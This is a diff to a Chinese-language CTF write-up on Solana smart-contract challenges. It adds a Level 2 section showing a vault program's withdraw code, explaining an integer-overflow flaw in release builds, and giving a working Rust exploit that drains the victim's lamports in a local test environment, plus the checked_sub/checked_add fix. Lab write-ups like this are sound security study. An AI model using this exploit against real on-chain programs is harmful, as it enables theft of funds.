@@ -102,7 +102,6 @@ $ docker run --name breakpoint-workshop -p 2222:22 -p 8383:80 -e PASSWORD="passw
             return Err(ProgramError::InsufficientFunds);
         }
 
-        // Subtract will fail if overflow
         **vault_info.lamports.borrow_mut() -= amount;
         **destination_info.lamports.borrow_mut() += amount;
 
@@ -213,3 +212,77 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
     env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
 }
 ```
+
+## Level 2 - Secure Personal Vault
+
+- 在 Level 1 的基础上，修复了 `withdraw` 未检查 signer 的问题
+
+    ```rs
+    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
+        msg!("withdraw {}", amount);
+        let account_info_iter = &mut accounts.iter();
+        let wallet_info = next_account_info(account_info_iter)?;
+        let authority_info = next_account_info(account_info_iter)?;
+        let destination_info = next_account_info(account_info_iter)?;
+        let rent_info = next_account_info(account_info_iter)?;
+
+        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;
+        let rent = Rent::from_account_info(rent_info)?;
+
+        assert_eq!(wallet_info.owner, program_id);
+        assert_eq!(wallet.authority, *authority_info.key);
+        assert!(authority_info.is_signer, "authority must sign!");
+
+        let min_balance = rent.minimum_balance(WALLET_LEN as usize);
+        if min_balance + amount > **wallet_info.lamports.borrow_mut() {
+            return Err(ProgramError::InsufficientFunds);
+        }
+
+        **wallet_info.lamports.borrow_mut() -= amount;
+        **destination_info.lamports.borrow_mut() += amount;
+
+        wallet
+            .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
+            .unwrap();
+
+        Ok(())
+    }
+    ```
+
+- 在 `debug` 模式下编译程序，Rust 将对整型溢出抛出异常，而在 `release` 模式下，Rust 将进行 *two's complement wrapping*，以 `u8` 为例，结果等同于模 $256$
+- 可以通过 `amount` 使 `wallet_info` 账户中的 `lamports` 下溢出来获取资金，并使 `destination_info` 账户中的 `lamports` 上溢出来减少其资金
+    - 另外还需通过上溢出绕过检查 `min_balance + amount > **wallet_info.lamports.borrow_mut()`
+- 推荐使用 `checked_sub`、`checked_add`
+
+### Exploit
+
+```rs
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    env.execute_as_transaction(&[level2::initialize(challenge.wallet_program, challenge.hacker.pubkey())], &[&challenge.hacker]).print_named("Hacker: initialize wallet");
+    let hacker_wallet = level2::get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);
+
+    let min_balance = Rent::default().minimum_balance(level2::WALLET_LEN as usize);
+    let amount = u64::max_value() - min_balance + 1;
+
+    for i in 0..10 {
+        env.execute_as_transaction(&[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new(challenge.wallet_address, false),
+                AccountMeta::new_readonly(sysvar::rent::id(), false),
+            ],
+            data: level2::WalletInstruction::Withdraw { amount: amount + i }.try_to_vec().unwrap(),
+        }], // 交易 `recent_blockhash` 相同，因而需要设置不同的参数，避免 This transaction has already been processed
+        &[&challenge.hacker]).print_named(format!("Hacker: exploit {}", i).as_str());
+    }
+    
+    env.execute_as_transaction(&[level2::withdraw(challenge.wallet_program, challenge.hacker.pubkey(), challenge.hacker.pubkey(), env.get_account(hacker_wallet).unwrap().lamports - min_balance)], &[&challenge.hacker]).print_named("Hacker: withdraw");
+}
+```
+
+### 参考资料
+
+- [Data Types - The Rust Programming Language](https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow)
+- [anchor - How to avoid SendTransactionError "This transaction has already been processed" - Solana Stack Exchange](https://solana.stackexchange.com/a/1178)
